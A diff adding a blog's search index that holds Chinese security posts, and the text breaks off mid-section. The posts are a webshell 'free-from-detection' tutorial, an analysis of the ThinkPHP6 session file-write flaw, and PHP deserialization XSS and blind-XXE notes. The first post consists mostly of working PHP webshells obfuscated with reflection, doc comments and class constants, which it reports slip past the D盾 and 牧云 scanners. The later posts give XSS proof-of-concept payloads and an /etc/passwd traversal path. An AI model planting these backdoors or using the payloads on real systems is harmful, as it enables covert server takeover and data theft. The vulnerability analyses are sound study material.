@@ -1,0 +1,561 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Webshell免杀的思考与学习</title>
+    <url>/2020/08/17/Webshell%E5%85%8D%E6%9D%80%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>webshell</code>对于渗透测试者来说是既是一种结束也是一种开始；一个免杀的<code>webshell</code>是我们在渗透测试过程中能否拿到目标权限的一个“前提”，首先webshell需要存活，其次是否能够执行命令，最后我们使用webshell管理工具时流量是否被拦截。所以免杀至关重要。</p>
+<a id="more"></a>
+<h1 id="我的第一个一句话木马"><a href="#我的第一个一句话木马" class="headerlink" title="我的第一个一句话木马"></a>我的第一个一句话木马</h1><p>很奇怪，我学习安全接触的的第一个一句话木马就是它：<code>$_GET[1]($_POST[2]);</code>，并且令我印象深刻。当时不太理解这个是因为PHP太灵活了，没想到还有这种写法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">'assert'</span>;</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure>
+<p>这个木马和上面的例子一样，是一种可变函数，<code>$_GET[1]</code>写为字符串<code>assert</code>，<code>$_POST[2]</code>写为命令<code>phpinfo()</code>。</p>
+<ul>
+<li><p>值得一提的是assert和eval：<br>手册写到eval()不是一个函数而是一个语言构造器，所以不能被可变函数调用；eval() 把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，<strong>且必须以分号结尾</strong>。<br>而assert()是一个函数，所以它相比eval灵活许多，可以被可变函数调用，也可以被回调函数来调用。</p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>我们通过webshell执行命令，是通过我们可控的参数来达到目的，而上面的一句话木马我们可控的部分为POST和GET参数。只要稍作改变就可以绕过D盾的检测</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key =  $_value;</span><br><span class="line">        $_key($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="1.png" alt=""></p>
+</li>
+<li><p>可以看到这里并没有达到免杀效果</p>
+</li>
+</ul>
+<p><img src="D1.png" alt=""></p>
+<ul>
+<li>接下来我又写了一个正常的类与函数，再次扫描发现D盾已经检测不出来了</li>
+</ul>
+<p><img src="D2.png" alt=""></p>
+<hr>
+<p>从可变函数的例子我们可以受到一些启发，通过翻阅PHP手册中的<strong>反射</strong>部分，我们可以得到一些可以利用的函数</p>
+<h1 id="少见的函数"><a href="#少见的函数" class="headerlink" title="少见的函数"></a>少见的函数</h1><h2 id="获取注释"><a href="#获取注释" class="headerlink" title="获取注释"></a>获取注释</h2><p>PHP中有这样一个函数，它可以获取php注释的内容<br><code>public ReflectionClass::getDocComment( void) : string</code><br>某些查杀引擎在查杀的时候，会做类似于编译器的优化，去掉我们所写的注释。毕竟注释是不能运行的，如果我们将参数通过非常规的方式传输进来，这样或许可以绕过一些查杀引擎呢。我们知道，安全狗查形，D盾查参，就拿D盾来试一试。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* YXNzZXJ0YWE=</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fn</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$reflector = <span class="keyword">new</span> ReflectionClass(<span class="string">'Example'</span>);</span><br><span class="line"></span><br><span class="line">$zhushi = substr(($reflector-&gt;getDocComment()), <span class="number">7</span>, <span class="number">12</span>);</span><br><span class="line">$zhushi = base64_decode($zhushi);</span><br><span class="line">$zhushi = substr($zhushi, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">        print_r($$_request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$zhushi($_value);</span><br></pre></td></tr></table></figure>
+<p><img src="D3.png" alt=""></p>
+<h2 id="获取定义过的一个常量"><a href="#获取定义过的一个常量" class="headerlink" title="获取定义过的一个常量"></a>获取定义过的一个常量</h2><p><code>public ReflectionClass::getConstants(void) : array</code><br>获取某个类的全部已定义的常量，不管可见性如何定义。 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="string">'As'</span>;</span><br><span class="line">    <span class="keyword">const</span> b = <span class="string">'se'</span>;</span><br><span class="line">    <span class="keyword">const</span> c = <span class="string">'rt'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$para1;</span><br><span class="line">$para2;</span><br><span class="line">$reflector = <span class="keyword">new</span> ReflectionClass(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">97</span>; $i &lt;= <span class="number">99</span>; $i++) &#123;</span><br><span class="line">    $para1 = $reflector-&gt;getConstant(chr($i));</span><br><span class="line">    $para2.=$para1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$para2($_value);</span><br></pre></td></tr></table></figure>
+<p><img src="D4.png" alt=""></p>
+<h2 id="获取一组常量"><a href="#获取一组常量" class="headerlink" title="获取一组常量"></a>获取一组常量</h2><p><code>public ReflectionClass::getConstants(void) : array</code><br>获取某个类的全部已定义的常量，不管可见性如何定义。 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> a = <span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">'aS'</span>,<span class="number">2</span>=&gt;<span class="string">'se'</span>,<span class="number">3</span>=&gt;<span class="string">'rT'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$refl = <span class="keyword">new</span> ReflectionClass(<span class="string">'Test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($refl-&gt;getConstants() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key =&gt; $value1) &#123;</span><br><span class="line">        $value2.=$value1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value) &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$value2($_value);</span><br></pre></td></tr></table></figure>
+<p><img src="D5.png" alt=""></p>
+<h2 id="类与继承"><a href="#类与继承" class="headerlink" title="类与继承"></a>类与继承</h2><p>P牛的《PHP动态特性的捕捉与逃逸》中提到了一个点，</p>
+<p><img src="php.png" alt=""></p>
+<p>除了PPT里提到的trick，还能想到什么呢？</p>
+<ul>
+<li>面向对象中，类能够继承类的属性与方法。或许可以从这两个点入手，因为测试绕过了”牧云”，就暂时不放出来结果了。<br>至于为什么可以绕过：我的猜想是这个函数不在黑名单中，语法分析不够完善，引擎认为我们的vuln代码并不能执行。</li>
+</ul>
+<p><img src="result1.gif" alt=""></p>
+<h2 id="创建类的实例"><a href="#创建类的实例" class="headerlink" title="创建类的实例"></a>创建类的实例</h2><p><code>public ReflectionClass::newInstance( mixed $args[, mixed $...] ) : object</code><br>简单地说，这个方法可以创建一个类的实例，同时该函数传递的参数会传递到该类的构造函数<br>需要注意的是，该方法传参和<code>call_user_func()</code>相似，不能使用引用类型传参，如果要使用引用类型使用另一个方法<code>newInstanceArgs</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($para)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//assert</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class1 = <span class="keyword">new</span> ReflectionClass(<span class="string">"Test1"</span>);</span><br><span class="line">$para = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//可控的$para</span></span><br><span class="line">$class2 = $class1-&gt;newInstance($para);</span><br></pre></td></tr></table></figure>
+<p>基本的框架就是这样了，对框架进行变形也可绕过”牧云”。</p>
+<p><img src="result2.gif" alt=""></p>
+]]></content>
+      <categories>
+        <category>Webshell</category>
+      </categories>
+      <tags>
+        <tag>Webshell免杀</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>test</title>
+    <url>/2019/10/28/test/</url>
+    <content><![CDATA[<h1 id="It-is-a-Test-Page"><a href="#It-is-a-Test-Page" class="headerlink" title="It is a Test Page"></a>It is a Test Page</h1><p>Hello World<br>最后编辑于2020.5.14</p>
+<a id="more"></a>
+<p>:)</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>ThinkPHP6任意文件操作漏洞分析</title>
+    <url>/2020/01/26/ThinkPHP6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>这个洞出来也有一段时间了，看了创宇的paper后觉得蛮简单的，决定自己在本地搭建复现一下，记录一下学习的过程。</p>
+<a id="more"></a>
+
+
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>apache + thinphp(&lt;=6.0.0版本&lt;=6.0.2) + php7以上</p>
+<ul>
+<li>ThinkPHP6起只能使用composer来安装，安装composer、php、apache的过程我就不赘述了。<br>执行命令:<code>composer create-project topthink/think tp 6.0.0</code>，其中tp是你的文件夹命名，6.0.0是版本号，6.0.1也可。<br>这里说一个问题，我这个时间Thinkphp的最新版是6.0.2，用上面的命令下载下来framework是6.0.2版本的，我们需要再执行一条命令：<code>composer require topthink/framework:6.0.0</code>：此时就会把将6.0.0的版本把6.0.2给替换掉</li>
+<li>进入tp的安装目录，执行<code>php think run</code>，它会开启一个临时的开发环境的服务器，默认运行在<code>localhost:8000</code>，打开浏览器访问显示正常即可<blockquote>
+<p>漏洞复现在apache下进行</p>
+</blockquote>
+</li>
+</ul>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞影响的版本：top-think/framework 6.x &lt; 6.0.2</p>
+<ul>
+<li>官方信息<br>ThinkPHP发布的补丁声称修复了一处由于不安全的SessionId导致的任意文件操作漏洞：在开启Session的情况下可以导致创建任意文件以及删除任意文件，特定情况下可以getshell</li>
+<li>根据这些信息，我们到官方GitHub的commit页面找一下相关的提交记录：<br><img src="github.png" alt="github"></li>
+</ul>
+<p>可以看到位于src/think/session/Store.php中212行在设置<code>id</code>时增加了一个函数：<code>ctype_alnum($text)</code>。<br>查一下PHP官方手册，这个函数是用来检测输入的<code>$text</code>中所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回FALSE<br><img src="ctype_alnum.png" alt="ctype_alnum"></p>
+<p>根据文件目录和更改的函数部分猜测：可能是存储Session时导致的文件写入；然后跟进找一下相关的函数，可以看到<code>vendor/topthink/framework/src/think/session/Store.php:254</code>的save()函数，265行还可以对文件进行删除操作，并且对后端业务逻辑依赖较低<br><img src="save.png" alt="save"></p>
+<p>可以看到设置了$sessionId，并且调用了一个write函数，继续跟进，找到write()函数<code>vendor/topthink/framework/src/think/session/driver/File.php:210</code><br><img src="write.png" alt="write"></p>
+<p>继续跟进，找到writeFile()函数<br><img src="writeFile.png" alt="writeFile"></p>
+<p>可以看到调用了<code>file_put_contents()</code>函数，这里是真正写入文件的操作了<br><img src="file_put_contents.png" alt="file_put_contents"></p>
+<ul>
+<li>接下来我们反向分析一下，看看能不能找到可控点</li>
+</ul>
+<ol>
+<li>函数<code>file_put_contents($path,$content,LOCK_EX)</code>中参数<code>$path,$content</code>来源于函数<code>writeFile($path,$data)</code></li>
+<li>函数<code>writeFile($path,$data)</code>中参数<code>$path,$data</code>来源于函数<code>write(String $sessionID,String $sessiData)</code></li>
+<li>函数<code>write(String $sessionID,String $sessiData)</code>中参数<code>$sessionID,$sessiData</code>来源于<code>save()</code>中调用了<code>write()</code>，同时传入的参数<code>$sessionId</code>的值是调用<code>getId()</code>传入的<br>综上：文件名来源于<code>$sessionId</code></li>
+</ol>
+<ul>
+<li><p>当传入的id值长度为32并且……etc时，创建<code>sessionId</code>，然后进行<code>gitId()</code><br><img src="session.png" alt="session"></p>
+</li>
+<li><p>接下来找调用<code>setId()</code>的地方<code>vendor/topthink/framework/src/think/middleware/SessionInit.php:46</code><br><img src="sessionI.png" alt="sessionI"><br>其中<code>cookieName</code>的值为<code>PHPSESSID</code>，而<code>$sessionId</code>是<code>cookie</code>中名为<code>PHPSESSID</code>的值，因此是攻击者可控的，从而导致写入的文件名可控。<br>但是默认环境下，<code>session</code>的内容由<code>vendor/topthink/framework/src/think/session/Store.php:261</code>的变量<code>$data</code>传入：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br></pre></td></tr></table></figure>
+<p><code>$data</code>在默认环境中为空：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Session数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $data = [];</span><br></pre></td></tr></table></figure>
+<p>写入的<code>session</code>内容是由实际的后端业务逻辑来决定的，所以说只有苛刻的条件下才能写入webshell。并且一开始就说了需要在环境开启<code>session</code>的情况下才可以实现任意文件操作(默认环境不开启session)</p>
+</li>
+<li><p>我们在<code>app\controller\index.php</code>中增加一些代码后，如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Session::set(<span class="string">'name'</span>,<span class="string">'thinkphp'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;style type="text/css"&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V6&lt;br/&gt;&lt;span style="font-size:30px"&gt;13载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;think id="eab4b9f840753f8e7"&gt;&lt;/think&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">($name = <span class="string">'ThinkPHP6'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'hello,'</span> . $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<blockquote>
+<p>忘了说了thinkphp6开启session的方法：删除<code>/app/middleware.php</code>最后一行的注释<br><img src="kq.png" alt="kq"></p>
+</blockquote>
+<h1 id="本地环境复现"><a href="#本地环境复现" class="headerlink" title="本地环境复现"></a>本地环境复现</h1><p>很简单，只需要构造PHPSESSID的值即可，值为<code>string</code>&amp;&amp;长度为32<br><img src="tp.png" alt="tp"><br>此时查看一下生成的session，生成的session文件保存在<code>\runtime\session</code>下<br><img src="sessionphp.png" alt="sessionphp"><br>session里的内容:</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:4:"name";s:8:"thinkphp";&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到session的内容经过了序列化操作，只要将session的内容反序列化即可getshell</p>
+<ul>
+<li>如果要getshell的话，后端需要有类似的<code>Session::Set(&#39;name&#39;,$_POST[&#39;i&#39;])</code>代码才可以利用</li>
+</ul>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>在复现的过程，也遇到了不少问题：首先ThinkPHP6开始不支持git了，只能通过composer来操作，由于从来没用过它也没经验，一开始安装环境一直下载不到旧版本，后来得到师傅的帮助终于下好了ThinkPHP6.0.0的环境，在这里感谢一下师傅<a href="https://weibo.com/u/5332465356" target="_blank" rel="noopener">@P1an0</a>对我的帮助。<br>这个漏洞其实很简单，就是用户可控变量导致的，也没有对一些数据的过滤等等。需要一定条件才可以利用，也就是开启session；写webshell还要看具体的后端业务逻辑等等。我觉得就这个框架来看其实可以更深入的进行挖掘，希望有大佬可以和我一起探讨学习</p>
+<p>参考的paper：<a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">ThinkPHP6 任意文件操作漏洞分析</a></p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>ThinkPHP6</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP反序列化和XXE的学习</title>
+    <url>/2020/06/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CXXE/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习的时候看了一个师傅的博客，里面提到的知识点可以扩大我们的攻击面，这里记录一下自己对这些知识点的理解和运用</p>
+<a id="more"></a>
+<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>这和我们平时遇到的反序列化利用不同，在不能使用phar协议进行反序列化的时候，通常我们挖掘反序列化POP链时的需要的条件：</p>
+<ol>
+<li>存在可控的反序列化参数</li>
+<li>程序中存在可用的类并且存在<code>wakeup()</code>或<code>destruct()</code>魔法函数</li>
+<li>该类在魔法函数中能否在当前调用中触发</li>
+</ol>
+<ul>
+<li>如果当前程序中不存在我们可用的类，那我们的POP链就断了。<h2 id="PHP可用的反序列化原生类"><a href="#PHP可用的反序列化原生类" class="headerlink" title="PHP可用的反序列化原生类"></a>PHP可用的反序列化原生类</h2></li>
+</ul>
+<ol>
+<li>Error<br>Error类就是php的一个内置类用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，原因是该类存在一个<code>__toString</code>方法，我们来复习一下<code>__toString</code>方法。<h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><code>__toString()</code>：当一个对象被当作一个字符串使用。此方法必须返回一个字符串，否则将发出一条<code>E_RECOVERABLE_ERROR</code>级别的致命错误。<blockquote>
+<p>当一个对象被当作一个字符串使用时候会触发。</p>
+</blockquote>
+</li>
+</ol>
+<ul>
+<li>由于php的语言特性，php一些函数会自动完成类型转换，下面是<code>__toString()</code>方法的触发条件</li>
+</ul>
+<ol>
+<li>echo ($obj) / print($obj) 打印时会触发</li>
+<li>反序列化对象与字符串连接时</li>
+<li>反序列化对象参与格式化字符串时</li>
+<li>反序列化对象与字符串进行<code>==</code>比较时（<strong>PHP进行==比较的时候会转换参数类型</strong>）</li>
+<li>反序列化对象参与格式化SQL语句，绑定参数时</li>
+<li>反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</li>
+<li>在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</li>
+<li>反序列化的对象作为 class_exists() 的参数的时候<br>所以结果很显然了，我们写一个demo来测试一下是否能触发XSS，就拿我上篇laravel反序列化的demo来测试一下<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Test</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>\<span class="title">Controller</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="comment">//test unserialize</span></span><br><span class="line">        $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">        unserialize($code);</span><br><span class="line">        <span class="keyword">echo</span> $code;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li>POC<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Error(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+可以看到成功弹窗<br><img src="xss1.png" alt="xss1"></li>
+</ul>
+<ol start="2">
+<li>Exception<br>这个类利用的方式和原理和<code>Error</code>类一样，不同是它适用于PHP5和PHP7，所以更好用</li>
+</ol>
+<ul>
+<li>POC<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+弹窗成功<br><img src="xss2.png" alt="xss2"></li>
+</ul>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>下面的代码来源于<a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $template;</span><br><span class="line">    <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>]; <span class="comment">//HomeController</span></span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个代码存在两种漏洞，第一种是任意文件读取，第二个就是盲打XXE。</p>
+<ol>
+<li>任意文件读取<br>这个漏洞的触发点在<code>class_exists</code>，我们来看php手册如何解释这个函数<br><img src="class_exists.png" alt="class_exists"><br>可以看到该函数存在2个参数，第一个是要检查的类，第二个参数<code>autoload</code>决定是否默认调用 __autoload。可以看到默认是<code>True</code><blockquote>
+<p>这个漏洞只能在php5.3之下利用</p>
+</blockquote>
+</li>
+</ol>
+<ul>
+<li>变量<code>$controllerName</code>可控，进入if判断我们传入的类是否存在，不存在则调用<code>__autoload</code>尝试加载，如果我们传入<code>../../../../etc/passwd</code>，就造成了任意文件读取<br><img src="%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.png" alt="任意文件读取"><br>由于我这里没有这么低版本的环境，就没有测试下去了（大于php5.3版本传入类名包含<code>.</code>和<code>/</code>就会自动跳出）</li>
+</ul>
+<ol start="2">
+<li>XXE<br>这里我们利用到了PHP的一个原生类SimpleXMLElement</li>
+</ol>
+<ul>
+<li>首先看源代码，漏洞触发点是在<code>$controller = new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);</code>实例化对象这里，这里用到了可变变量，所以我们new一个任意的对象。</li>
+<li>接下来看原生类SimpleXMLElement的构造方法<br><img src="SimpleXMLElement__construct.png" alt="SimpleXMLElement::__construct"><br>参数：</li>
+<li>data：格式正确的XML字符串，当参数<code>data_is_url</code>是<code>True</code>时，传入一个URL字符串</li>
+<li>options：（可选）用于指定其他Libxml参数。</li>
+</ul>
+<p>思路就是传入一个<code>SimpleXMLElement</code>类进行实例化，当XML外部实体可控，就造成XXE，源码没有echo等函数回显，所以我们利用盲打XXE</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul>
